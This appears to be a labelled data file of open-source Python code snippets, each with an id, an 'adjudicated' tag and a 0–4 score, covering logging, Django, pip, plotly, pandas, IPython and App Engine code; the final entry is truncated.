241	adjudicated	1	"""""""A simple log mechanism styled after PEP 282.""""""

# The class here is styled after PEP 282 so that it could later be
# replaced with a standard Python logging implementation.

import sys

DEBUG = 1
INFO = 2
WARN = 3
ERROR = 4
FATAL = 5


class Log:
    def __init__(self, threshold=WARN):
        self.threshold = threshold

    def _log(self, level, msg, args):
        if level not in (DEBUG, INFO, WARN, ERROR, FATAL):
            raise ValueError('%s wrong log level' % str(level))

        if level >= self.threshold:
            if args:
                msg = msg % args
            if level in (WARN, ERROR, FATAL):
                stream = sys.stderr
            else:
                stream = sys.stdout
            try:
                stream.write('%s\n' % msg)
            except UnicodeEncodeError:
                # emulate backslashreplace error handler
                encoding = stream.encoding
                msg = msg.encode(encoding, ""backslashreplace"").decode(encoding)
                stream.write('%s\n' % msg)
            stream.flush()

    def log(self, level, msg, *args):
        self._log(level, msg, args)

    def debug(self, msg, *args):
        self._log(DEBUG, msg, args)

    def info(self, msg, *args):
        self._log(INFO, msg, args)

    def warn(self, msg, *args):
        self._log(WARN, msg, args)

    def error(self, msg, *args):
        self._log(ERROR, msg, args)

    def fatal(self, msg, *args):
        self._log(FATAL, msg, args)


_global_log = Log()
log = _global_log.log
debug = _global_log.debug
info = _global_log.info
warn = _global_log.warn
error = _global_log.error
fatal = _global_log.fatal


def set_threshold(level):
    # return the old threshold for use from tests
    old = _global_log.threshold
    _global_log.threshold = level
    return old


def set_verbosity(v):
    if v <= 0:
        set_threshold(WARN)
    elif v == 1:
        set_threshold(INFO)
    elif v >= 2:
        set_threshold(DEBUG)"
90	adjudicated	0	"# Copyright 2016 Google Inc. All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pytest
import webtest

import guestbook


@pytest.fixture
def app(testbed):
    return webtest.TestApp(guestbook.app)


def test_get_guestbook_sync(app, testbed, login):
    guestbook.Account(id='123').put()
    # Log the user in
    login(id='123')

    for i in range(11):
        guestbook.Guestbook(content='Content {}'.format(i)).put()

    response = app.get('/guestbook')

    assert response.status_int == 200
    assert 'Content 1' in response.body


def test_get_guestbook_async(app, testbed, login):
    guestbook.Account(id='123').put()
    # Log the user in
    login(id='123')
    for i in range(11):
        guestbook.Guestbook(content='Content {}'.format(i)).put()

    response = app.get('/guestbook?async=1')

    assert response.status_int == 200
    assert 'Content 1' in response.body


def test_get_messages_sync(app, testbed):
    for i in range(21):
        account_key = guestbook.Account(nickname='Nick {}'.format(i)).put()
        guestbook.Message(author=account_key, text='Text {}'.format(i)).put()

    response = app.get('/messages')

    assert response.status_int == 200
    assert 'Nick 1 wrote:' in response.body
    assert '<p>Text 1' in response.body


def test_get_messages_async(app, testbed):
    for i in range(21):
        account_key = guestbook.Account(nickname='Nick {}'.format(i)).put()
        guestbook.Message(author=account_key, text='Text {}'.format(i)).put()

    response = app.get('/messages?async=1')

    assert response.status_int == 200
    assert 'Nick 1 wrote:' in response.body
    assert '\nText 1' in response.body"
301	adjudicated	4	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = r'Y. \g\a\d\a j. F'
TIME_FORMAT = 'H:i'
DATETIME_FORMAT = r'Y. \g\a\d\a j. F, H:i'
YEAR_MONTH_FORMAT = r'Y. \g. F'
MONTH_DAY_FORMAT = 'j. F'
SHORT_DATE_FORMAT = r'j.m.Y'
SHORT_DATETIME_FORMAT = 'j.m.Y H:i'
FIRST_DAY_OF_WEEK = 1  # Monday

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
# Kept ISO formats as they are in first position
DATE_INPUT_FORMATS = [
    '%Y-%m-%d', '%d.%m.%Y', '%d.%m.%y',  # '2006-10-25', '25.10.2006', '25.10.06'
]
TIME_INPUT_FORMATS = [
    '%H:%M:%S',     # '14:30:59'
    '%H:%M:%S.%f',  # '14:30:59.000200'
    '%H:%M',        # '14:30'
    '%H.%M.%S',     # '14.30.59'
    '%H.%M.%S.%f',  # '14.30.59.000200'
    '%H.%M',        # '14.30'
]
DATETIME_INPUT_FORMATS = [
    '%Y-%m-%d %H:%M:%S',     # '2006-10-25 14:30:59'
    '%Y-%m-%d %H:%M:%S.%f',  # '2006-10-25 14:30:59.000200'
    '%Y-%m-%d %H:%M',        # '2006-10-25 14:30'
    '%d.%m.%Y %H:%M:%S',     # '25.10.2006 14:30:59'
    '%d.%m.%Y %H:%M:%S.%f',  # '25.10.2006 14:30:59.000200'
    '%d.%m.%Y %H:%M',        # '25.10.2006 14:30'
    '%d.%m.%y %H:%M:%S',     # '25.10.06 14:30:59'
    '%d.%m.%y %H:%M:%S.%f',  # '25.10.06 14:30:59.000200'
    '%d.%m.%y %H:%M',        # '25.10.06 14:30'
    '%d.%m.%y %H.%M.%S',     # '25.10.06 14.30.59'
    '%d.%m.%y %H.%M.%S.%f',  # '25.10.06 14.30.59.000200'
    '%d.%m.%y %H.%M',        # '25.10.06 14.30'
]
DECIMAL_SEPARATOR = ','
THOUSAND_SEPARATOR = 'Â '  # Non-breaking space
NUMBER_GROUPING = 3"
181	adjudicated	3	"from typing import Optional

from pip._internal.models.format_control import FormatControl


class SelectionPreferences:
    """"""
    Encapsulates the candidate selection preferences for downloading
    and installing files.
    """"""

    __slots__ = [
        ""allow_yanked"",
        ""allow_all_prereleases"",
        ""format_control"",
        ""prefer_binary"",
        ""ignore_requires_python"",
    ]

    # Don't include an allow_yanked default value to make sure each call
    # site considers whether yanked releases are allowed. This also causes
    # that decision to be made explicit in the calling code, which helps
    # people when reading the code.
    def __init__(
        self,
        allow_yanked: bool,
        allow_all_prereleases: bool = False,
        format_control: Optional[FormatControl] = None,
        prefer_binary: bool = False,
        ignore_requires_python: Optional[bool] = None,
    ) -> None:
        """"""Create a SelectionPreferences object.

        :param allow_yanked: Whether files marked as yanked (in the sense
            of PEP 592) are permitted to be candidates for install.
        :param format_control: A FormatControl object or None. Used to control
            the selection of source packages / binary packages when consulting
            the index and links.
        :param prefer_binary: Whether to prefer an old, but valid, binary
            dist over a new source dist.
        :param ignore_requires_python: Whether to ignore incompatible
            ""Requires-Python"" values in links. Defaults to False.
        """"""
        if ignore_requires_python is None:
            ignore_requires_python = False

        self.allow_yanked = allow_yanked
        self.allow_all_prereleases = allow_all_prereleases
        self.format_control = format_control
        self.prefer_binary = prefer_binary
        self.ignore_requires_python = ignore_requires_python"
210	adjudicated	1	"""""""A simple log mechanism styled after PEP 282.""""""

# The class here is styled after PEP 282 so that it could later be
# replaced with a standard Python logging implementation.

DEBUG = 1
INFO = 2
WARN = 3
ERROR = 4
FATAL = 5

import sys

class Log:

    def __init__(self, threshold=WARN):
        self.threshold = threshold

    def _log(self, level, msg, args):
        if level not in (DEBUG, INFO, WARN, ERROR, FATAL):
            raise ValueError('%s wrong log level' % str(level))

        if level >= self.threshold:
            if args:
                msg = msg % args
            if level in (WARN, ERROR, FATAL):
                stream = sys.stderr
            else:
                stream = sys.stdout
            try:
                stream.write('%s\n' % msg)
            except UnicodeEncodeError:
                # emulate backslashreplace error handler
                encoding = stream.encoding
                msg = msg.encode(encoding, ""backslashreplace"").decode(encoding)
                stream.write('%s\n' % msg)
            stream.flush()

    def log(self, level, msg, *args):
        self._log(level, msg, args)

    def debug(self, msg, *args):
        self._log(DEBUG, msg, args)

    def info(self, msg, *args):
        self._log(INFO, msg, args)

    def warn(self, msg, *args):
        self._log(WARN, msg, args)

    def error(self, msg, *args):
        self._log(ERROR, msg, args)

    def fatal(self, msg, *args):
        self._log(FATAL, msg, args)

_global_log = Log()
log = _global_log.log
debug = _global_log.debug
info = _global_log.info
warn = _global_log.warn
error = _global_log.error
fatal = _global_log.fatal

def set_threshold(level):
    # return the old threshold for use from tests
    old = _global_log.threshold
    _global_log.threshold = level
    return old

def set_verbosity(v):
    if v <= 0:
        set_threshold(WARN)
    elif v == 1:
        set_threshold(INFO)
    elif v >= 2:
        set_threshold(DEBUG)"
350	adjudicated	1	"import os
import signal
import subprocess

from django.db.backends.base.client import BaseDatabaseClient


class DatabaseClient(BaseDatabaseClient):
    executable_name = 'psql'

    @classmethod
    def runshell_db(cls, conn_params, parameters):
        args = [cls.executable_name]

        host = conn_params.get('host', '')
        port = conn_params.get('port', '')
        dbname = conn_params.get('database', '')
        user = conn_params.get('user', '')
        passwd = conn_params.get('password', '')
        sslmode = conn_params.get('sslmode', '')
        sslrootcert = conn_params.get('sslrootcert', '')
        sslcert = conn_params.get('sslcert', '')
        sslkey = conn_params.get('sslkey', '')

        if user:
            args += ['-U', user]
        if host:
            args += ['-h', host]
        if port:
            args += ['-p', str(port)]
        args += [dbname]
        args.extend(parameters)

        sigint_handler = signal.getsignal(signal.SIGINT)
        subprocess_env = os.environ.copy()
        if passwd:
            subprocess_env['PGPASSWORD'] = str(passwd)
        if sslmode:
            subprocess_env['PGSSLMODE'] = str(sslmode)
        if sslrootcert:
            subprocess_env['PGSSLROOTCERT'] = str(sslrootcert)
        if sslcert:
            subprocess_env['PGSSLCERT'] = str(sslcert)
        if sslkey:
            subprocess_env['PGSSLKEY'] = str(sslkey)
        try:
            # Allow SIGINT to pass to psql to abort queries.
            signal.signal(signal.SIGINT, signal.SIG_IGN)
            subprocess.run(args, check=True, env=subprocess_env)
        finally:
            # Restore the original SIGINT handler.
            signal.signal(signal.SIGINT, sigint_handler)

    def runshell(self, parameters):
        self.runshell_db(self.connection.get_connection_params(), parameters)"
172	adjudicated	2	"import _plotly_utils.basevalidators


class LineValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""line"", parent_name=""scattersmith"", **kwargs):
        super(LineValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Line""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            backoff
                Sets the line back off from the end point of
                the nth line segment (in px). This option is
                useful e.g. to avoid overlap with arrowhead
                markers. With ""auto"" the lines would trim
                before markers if `marker.angleref` is set to
                ""previous"".
            backoffsrc
                Sets the source reference on Chart Studio Cloud
                for `backoff`.
            color
                Sets the line color.
            dash
                Sets the dash style of lines. Set to a dash
                type string (""solid"", ""dot"", ""dash"",
                ""longdash"", ""dashdot"", or ""longdashdot"") or a
                dash length list in px (eg ""5px,10px,2px,2px"").
            shape
                Determines the line shape. With ""spline"" the
                lines are drawn using spline interpolation. The
                other available values correspond to step-wise
                line shapes.
            smoothing
                Has an effect only if `shape` is set to
                ""spline"" Sets the amount of smoothing. 0
                corresponds to no smoothing (equivalent to a
                ""linear"" shape).
            width
                Sets the line width (in px).
"""""",
            ),
            **kwargs,
        )"
32	adjudicated	2	"import _plotly_utils.basevalidators


class OutsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""outsidetextfont"", parent_name=""funnel"", **kwargs):
        super(OutsidetextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Outsidetextfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
123	adjudicated	0	"import requests
import re
import json
from urllib.parse import urlencode


def convert_secid(secid: str) -> str:
    if secid[0] == '6' or secid[0] == '5':
        return f'1.{secid}'
    return f'0.{secid}'


def fetch_close_price(secid: str) -> float:
    secid = convert_secid(secid)

    headers = {
        ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0""
    }

    base_url = ""http://push2.eastmoney.com/api/qt/stock/get""

    parameters = (
        (""invt"", 2),
        (""fltt"", 1),
        (""cb"", ""jQuery3510768790004533975_1671331577142""),
        (""fields"", ""f58,f734,f107,f57,f43,f59,f169,f170,f152,f177,f111,f46,f60,f44,f45,f47,f260,f48,f261,f279,f277,f278,f288,f19,f17,f531,f15,f13,f11,f20,f18,f16,f14,f12,f39,f37,f35,f33,f31,f40,f38,f36,f34,f32,f211,f212,f213,f214,f215,f210,f209,f208,f207,f206,f161,f49,f171,f50,f86,f84,f85,f168,f108,f116,f167,f164,f162,f163,f92,f71,f117,f292,f51,f52,f191,f192,f262""),
        (""secid"", secid),
        (""ut"", ""fa5fd1943c7b386f172d6893dbfba10b""),
        (""wbp2u"", ""|0|0|0|web""),
        (""_"", ""1671331577143""),
    )

    url = base_url + '?' + urlencode(parameters)

    resp = requests.get(url, headers=headers)
    if resp.status_code == requests.codes.ok:
        try:
            jq = resp.content.decode('utf-8')
            p = re.compile(""jQuery[0-9_(]+(.*)\);"")
            m = p.match(jq)
            js = json.loads(m.group(1))
            close_price_int = int(js[""data""][""f43""])
            precision = int(js[""data""][""f59""])
            close_price = close_price_int / pow(10, precision)
            return close_price
        except:
            print(f""url = {url}"")
            print(f""resp = {resp.content}"")
    else:
        print(f""url = {url}"")
        print(f""status = {resp.status_code}"")

"
63	adjudicated	2	"import _plotly_utils.basevalidators


class SymbolValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""symbol"", parent_name=""layout.mapbox.layer"", **kwargs
    ):
        super(SymbolValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Symbol""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            icon
                Sets the symbol icon image
                (mapbox.layer.layout.icon-image). Full list:
                https://www.mapbox.com/maki-icons/
            iconsize
                Sets the symbol icon size
                (mapbox.layer.layout.icon-size). Has an effect
                only when `type` is set to ""symbol"".
            placement
                Sets the symbol and/or text placement
                (mapbox.layer.layout.symbol-placement). If
                `placement` is ""point"", the label is placed
                where the geometry is located If `placement` is
                ""line"", the label is placed along the line of
                the geometry If `placement` is ""line-center"",
                the label is placed on the center of the
                geometry
            text
                Sets the symbol text (mapbox.layer.layout.text-
                field).
            textfont
                Sets the icon text font
                (color=mapbox.layer.paint.text-color,
                size=mapbox.layer.layout.text-size). Has an
                effect only when `type` is set to ""symbol"".
            textposition
                Sets the positions of the `text` elements with
                respects to the (x,y) coordinates.
"""""",
            ),
            **kwargs,
        )"
364	adjudicated	1	"import numpy as np
import numba as nb

from numpy.random import PCG64
from timeit import timeit

bit_gen = PCG64()
next_d = bit_gen.cffi.next_double
state_addr = bit_gen.cffi.state_address

def normals(n, state):
    out = np.empty(n)
    for i in range((n + 1) // 2):
        x1 = 2.0 * next_d(state) - 1.0
        x2 = 2.0 * next_d(state) - 1.0
        r2 = x1 * x1 + x2 * x2
        while r2 >= 1.0 or r2 == 0.0:
            x1 = 2.0 * next_d(state) - 1.0
            x2 = 2.0 * next_d(state) - 1.0
            r2 = x1 * x1 + x2 * x2
        f = np.sqrt(-2.0 * np.log(r2) / r2)
        out[2 * i] = f * x1
        if 2 * i + 1 < n:
            out[2 * i + 1] = f * x2
    return out

# Compile using Numba
normalsj = nb.jit(normals, nopython=True)
# Must use state address not state with numba
n = 10000

def numbacall():
    return normalsj(n, state_addr)

rg = np.random.Generator(PCG64())

def numpycall():
    return rg.normal(size=n)

# Check that the functions work
r1 = numbacall()
r2 = numpycall()
assert r1.shape == (n,)
assert r1.shape == r2.shape

t1 = timeit(numbacall, number=1000)
print(f'{t1:.2f} secs for {n} PCG64 (Numba/PCG64) gaussian randoms')
t2 = timeit(numpycall, number=1000)
print(f'{t2:.2f} secs for {n} PCG64 (NumPy/PCG64) gaussian randoms')

# example 2

next_u32 = bit_gen.ctypes.next_uint32
ctypes_state = bit_gen.ctypes.state

@nb.jit(nopython=True)
def bounded_uint(lb, ub, state):
    mask = delta = ub - lb
    mask |= mask >> 1
    mask |= mask >> 2
    mask |= mask >> 4
    mask |= mask >> 8
    mask |= mask >> 16

    val = next_u32(state) & mask
    while val > delta:
        val = next_u32(state) & mask

    return lb + val


print(bounded_uint(323, 2394691, ctypes_state.value))


@nb.jit(nopython=True)
def bounded_uints(lb, ub, n, state):
    out = np.empty(n, dtype=np.uint32)
    for i in range(n):
        out[i] = bounded_uint(lb, ub, state)


bounded_uints(323, 2394691, 10000000, ctypes_state.value)

"
224	adjudicated	4	"""""""Fix the name of modules

This module is useful when you want to rename many of the modules in
your project.  That can happen specially when you want to change their
naming style.

For instance::

  fixer = FixModuleNames(project)
  changes = fixer.get_changes(fixer=str.lower)
  project.do(changes)

Here it renames all modules and packages to use lower-cased chars.
You can tell it to use any other style by using the ``fixer``
argument.

""""""
from rope.base import taskhandle
from rope.contrib import changestack
from rope.refactor import rename


class FixModuleNames:
    def __init__(self, project):
        self.project = project

    def get_changes(self, fixer=str.lower, task_handle=taskhandle.DEFAULT_TASK_HANDLE):
        """"""Fix module names

        `fixer` is a function that takes and returns a `str`.  Given
        the name of a module, it should return the fixed name.

        """"""
        stack = changestack.ChangeStack(self.project, ""Fixing module names"")
        jobset = task_handle.create_jobset(
            ""Fixing module names"", self._count_fixes(fixer) + 1
        )
        try:
            while True:
                for resource in self._tobe_fixed(fixer):
                    jobset.started_job(resource.path)
                    renamer = rename.Rename(self.project, resource)
                    changes = renamer.get_changes(fixer(self._name(resource)))
                    stack.push(changes)
                    jobset.finished_job()
                    break
                else:
                    break
        finally:
            jobset.started_job(""Reverting to original state"")
            stack.pop_all()
            jobset.finished_job()
        return stack.merged()

    def _count_fixes(self, fixer):
        return len(list(self._tobe_fixed(fixer)))

    def _tobe_fixed(self, fixer):
        for resource in self.project.get_python_files():
            modname = self._name(resource)
            if modname != fixer(modname):
                yield resource

    def _name(self, resource):
        modname = resource.name.rsplit(""."", 1)[0]
        if modname == ""__init__"":
            modname = resource.parent.name
        return modname"
335	adjudicated	3	"import functools
import operator
import itertools

from .extern.jaraco.text import yield_lines
from .extern.jaraco.functools import pass_none
from ._importlib import metadata
from ._itertools import ensure_unique
from .extern.more_itertools import consume


def ensure_valid(ep):
    """"""
    Exercise one of the dynamic properties to trigger
    the pattern match.
    """"""
    ep.extras


def load_group(value, group):
    """"""
    Given a value of an entry point or series of entry points,
    return each as an EntryPoint.
    """"""
    # normalize to a single sequence of lines
    lines = yield_lines(value)
    text = f'[{group}]\n' + '\n'.join(lines)
    return metadata.EntryPoints._from_text(text)


def by_group_and_name(ep):
    return ep.group, ep.name


def validate(eps: metadata.EntryPoints):
    """"""
    Ensure entry points are unique by group and name and validate each.
    """"""
    consume(map(ensure_valid, ensure_unique(eps, key=by_group_and_name)))
    return eps


@functools.singledispatch
def load(eps):
    """"""
    Given a Distribution.entry_points, produce EntryPoints.
    """"""
    groups = itertools.chain.from_iterable(
        load_group(value, group)
        for group, value in eps.items())
    return validate(metadata.EntryPoints(groups))


@load.register(str)
def _(eps):
    r""""""
    >>> ep, = load('[console_scripts]\nfoo=bar')
    >>> ep.group
    'console_scripts'
    >>> ep.name
    'foo'
    >>> ep.value
    'bar'
    """"""
    return validate(metadata.EntryPoints(metadata.EntryPoints._from_text(eps)))


load.register(type(None), lambda x: x)


@pass_none
def render(eps: metadata.EntryPoints):
    by_group = operator.attrgetter('group')
    groups = itertools.groupby(sorted(eps, key=by_group), by_group)

    return '\n'.join(
        f'[{group}]\n{render_items(items)}\n'
        for group, items in groups
    )


def render_items(eps):
    return '\n'.join(
        f'{ep.name} = {ep.value}'
        for ep in sorted(eps)
    )"
275	adjudicated	1	"import pytest
from traitlets import HasTraits, TraitError
from traitlets.utils.importstring import import_item

from notebook.traittypes import (
    InstanceFromClasses,
    TypeFromClasses
)
from notebook.services.contents.largefilemanager import LargeFileManager


class DummyClass:
    """"""Dummy class for testing Instance""""""


class DummyInt(int):
    """"""Dummy class for testing types.""""""


class Thing(HasTraits):

    a = InstanceFromClasses(
        default_value=2,
        klasses=[
            int,
            str,
            DummyClass,
        ]
    )

    b = TypeFromClasses(
        default_value=None,
        allow_none=True,
        klasses=[
            DummyClass,
            int,
            'notebook.services.contents.manager.ContentsManager'
        ]
    )


class TestInstanceFromClasses:

    @pytest.mark.parametrize(
        'value',
        [1, 'test', DummyClass()]
    )
    def test_good_values(self, value):
        thing = Thing(a=value)
        assert thing.a == value

    @pytest.mark.parametrize(
        'value',
        [2.4, object()]
    )
    def test_bad_values(self, value):
        with pytest.raises(TraitError) as e:
            thing = Thing(a=value)


class TestTypeFromClasses:

    @pytest.mark.parametrize(
        'value',
        [DummyClass, DummyInt, LargeFileManager,
            'notebook.services.contents.manager.ContentsManager']
    )
    def test_good_values(self, value):
        thing = Thing(b=value)
        if isinstance(value, str):
            value = import_item(value)
        assert thing.b == value

    @pytest.mark.parametrize(
        'value',
        [float, object]
    )
    def test_bad_values(self, value):
        with pytest.raises(TraitError) as e:
            thing = Thing(b=value)"
57	adjudicated	3	"# Copyright 2016 Google Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

""""""
Sample Google App Engine application that demonstrates using the Users API

For more information about App Engine, see README.md under /appengine.
""""""

# [START all]

from google.appengine.api import users
import webapp2


class MainPage(webapp2.RequestHandler):
    def get(self):
        # [START user_details]
        user = users.get_current_user()
        if user:
            nickname = user.nickname()
            logout_url = users.create_logout_url('/')
            greeting = 'Welcome, {}! (<a href=""{}"">sign out</a>)'.format(
                nickname, logout_url)
        else:
            login_url = users.create_login_url('/')
            greeting = '<a href=""{}"">Sign in</a>'.format(login_url)
        # [END user_details]
        self.response.write(
            '<html><body>{}</body></html>'.format(greeting))


class AdminPage(webapp2.RequestHandler):
    def get(self):
        user = users.get_current_user()
        if user:
            if users.is_current_user_admin():
                self.response.write('You are an administrator.')
            else:
                self.response.write('You are not an administrator.')
        else:
            self.response.write('You are not logged in.')


app = webapp2.WSGIApplication([
    ('/', MainPage),
    ('/admin', AdminPage)
], debug=True)

# [END all]"
117	adjudicated	2	"import _plotly_utils.basevalidators


class LineValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""line"", parent_name=""scatterternary"", **kwargs):
        super(LineValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Line""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            backoff
                Sets the line back off from the end point of
                the nth line segment (in px). This option is
                useful e.g. to avoid overlap with arrowhead
                markers. With ""auto"" the lines would trim
                before markers if `marker.angleref` is set to
                ""previous"".
            backoffsrc
                Sets the source reference on Chart Studio Cloud
                for `backoff`.
            color
                Sets the line color.
            dash
                Sets the dash style of lines. Set to a dash
                type string (""solid"", ""dot"", ""dash"",
                ""longdash"", ""dashdot"", or ""longdashdot"") or a
                dash length list in px (eg ""5px,10px,2px,2px"").
            shape
                Determines the line shape. With ""spline"" the
                lines are drawn using spline interpolation. The
                other available values correspond to step-wise
                line shapes.
            smoothing
                Has an effect only if `shape` is set to
                ""spline"" Sets the amount of smoothing. 0
                corresponds to no smoothing (equivalent to a
                ""linear"" shape).
            width
                Sets the line width (in px).
"""""",
            ),
            **kwargs,
        )"
286	adjudicated	4	"""""""
Behavioral based tests for offsets and date_range.

This file is adapted from https://github.com/pandas-dev/pandas/pull/18761 -
which was more ambitious but less idiomatic in its use of Hypothesis.

You may wish to consult the previous version for inspiration on further
tests, or when trying to pin down the bugs exposed by the tests below.
""""""
from hypothesis import (
    assume,
    given,
)
import pytest
import pytz

import pandas as pd
from pandas._testing._hypothesis import (
    DATETIME_JAN_1_1900_OPTIONAL_TZ,
    YQM_OFFSET,
)

# ----------------------------------------------------------------
# Offset-specific behaviour tests


@pytest.mark.arm_slow
@given(DATETIME_JAN_1_1900_OPTIONAL_TZ, YQM_OFFSET)
def test_on_offset_implementations(dt, offset):
    assume(not offset.normalize)
    # check that the class-specific implementations of is_on_offset match
    # the general case definition:
    #   (dt + offset) - offset == dt
    try:
        compare = (dt + offset) - offset
    except (pytz.NonExistentTimeError, pytz.AmbiguousTimeError):
        # When dt + offset does not exist or is DST-ambiguous, assume(False) to
        # indicate to hypothesis that this is not a valid test case
        # DST-ambiguous example (GH41906):
        # dt = datetime.datetime(1900, 1, 1, tzinfo=pytz.timezone('Africa/Kinshasa'))
        # offset = MonthBegin(66)
        assume(False)

    assert offset.is_on_offset(dt) == (compare == dt)


@given(YQM_OFFSET)
def test_shift_across_dst(offset):
    # GH#18319 check that 1) timezone is correctly normalized and
    # 2) that hour is not incorrectly changed by this normalization
    assume(not offset.normalize)

    # Note that dti includes a transition across DST boundary
    dti = pd.date_range(
        start=""2017-10-30 12:00:00"", end=""2017-11-06"", freq=""D"", tz=""US/Eastern""
    )
    assert (dti.hour == 12).all()  # we haven't screwed up yet

    res = dti + offset
    assert (res.hour == 12).all()"
6	adjudicated	0	"import sys
from typing import TYPE_CHECKING

if sys.version_info < (3, 7) or TYPE_CHECKING:
    from ._ysrc import YsrcValidator
    from ._y import YValidator
    from ._xsrc import XsrcValidator
    from ._x import XValidator
    from ._thickness import ThicknessValidator
    from ._pad import PadValidator
    from ._line import LineValidator
    from ._labelsrc import LabelsrcValidator
    from ._label import LabelValidator
    from ._hovertemplatesrc import HovertemplatesrcValidator
    from ._hovertemplate import HovertemplateValidator
    from ._hoverlabel import HoverlabelValidator
    from ._hoverinfo import HoverinfoValidator
    from ._groups import GroupsValidator
    from ._customdatasrc import CustomdatasrcValidator
    from ._customdata import CustomdataValidator
    from ._colorsrc import ColorsrcValidator
    from ._color import ColorValidator
else:
    from _plotly_utils.importers import relative_import

    __all__, __getattr__, __dir__ = relative_import(
        __name__,
        [],
        [
            ""._ysrc.YsrcValidator"",
            ""._y.YValidator"",
            ""._xsrc.XsrcValidator"",
            ""._x.XValidator"",
            ""._thickness.ThicknessValidator"",
            ""._pad.PadValidator"",
            ""._line.LineValidator"",
            ""._labelsrc.LabelsrcValidator"",
            ""._label.LabelValidator"",
            ""._hovertemplatesrc.HovertemplatesrcValidator"",
            ""._hovertemplate.HovertemplateValidator"",
            ""._hoverlabel.HoverlabelValidator"",
            ""._hoverinfo.HoverinfoValidator"",
            ""._groups.GroupsValidator"",
            ""._customdatasrc.CustomdatasrcValidator"",
            ""._customdata.CustomdataValidator"",
            ""._colorsrc.ColorsrcValidator"",
            ""._color.ColorValidator"",
        ],
    )"
397	adjudicated	2	"import tempfile, os
from pathlib import Path

from traitlets.config.loader import Config


def setup_module():
    ip.magic('load_ext storemagic')

def test_store_restore():
    assert 'bar' not in ip.user_ns, ""Error: some other test leaked `bar` in user_ns""
    assert 'foo' not in ip.user_ns, ""Error: some other test leaked `foo` in user_ns""
    assert 'foobar' not in ip.user_ns, ""Error: some other test leaked `foobar` in user_ns""
    assert 'foobaz' not in ip.user_ns, ""Error: some other test leaked `foobaz` in user_ns""
    ip.user_ns['foo'] = 78
    ip.magic('alias bar echo ""hello""')
    ip.user_ns['foobar'] = 79
    ip.user_ns['foobaz'] = '80'
    tmpd = tempfile.mkdtemp()
    ip.magic('cd ' + tmpd)
    ip.magic('store foo')
    ip.magic('store bar')
    ip.magic('store foobar foobaz')

    # Check storing
    assert ip.db[""autorestore/foo""] == 78
    assert ""bar"" in ip.db[""stored_aliases""]
    assert ip.db[""autorestore/foobar""] == 79
    assert ip.db[""autorestore/foobaz""] == ""80""

    # Remove those items
    ip.user_ns.pop('foo', None)
    ip.user_ns.pop('foobar', None)
    ip.user_ns.pop('foobaz', None)
    ip.alias_manager.undefine_alias('bar')
    ip.magic('cd -')
    ip.user_ns['_dh'][:] = []

    # Check restoring
    ip.magic(""store -r foo bar foobar foobaz"")
    assert ip.user_ns[""foo""] == 78
    assert ip.alias_manager.is_alias(""bar"")
    assert ip.user_ns[""foobar""] == 79
    assert ip.user_ns[""foobaz""] == ""80""

    ip.magic(""store -r"")  # restores _dh too
    assert any(Path(tmpd).samefile(p) for p in ip.user_ns[""_dh""])

    os.rmdir(tmpd)

def test_autorestore():
    ip.user_ns['foo'] = 95
    ip.magic('store foo')
    del ip.user_ns['foo']
    c = Config()
    c.StoreMagics.autorestore = False
    orig_config = ip.config
    try:
        ip.config = c
        ip.extension_manager.reload_extension(""storemagic"")
        assert ""foo"" not in ip.user_ns
        c.StoreMagics.autorestore = True
        ip.extension_manager.reload_extension(""storemagic"")
        assert ip.user_ns[""foo""] == 95
    finally:
        ip.config = orig_config"
146	adjudicated	3	"""""""
Simple console example that echos the input converted to uppercase.
""""""

import sys
import asyncio

from typing import Callable

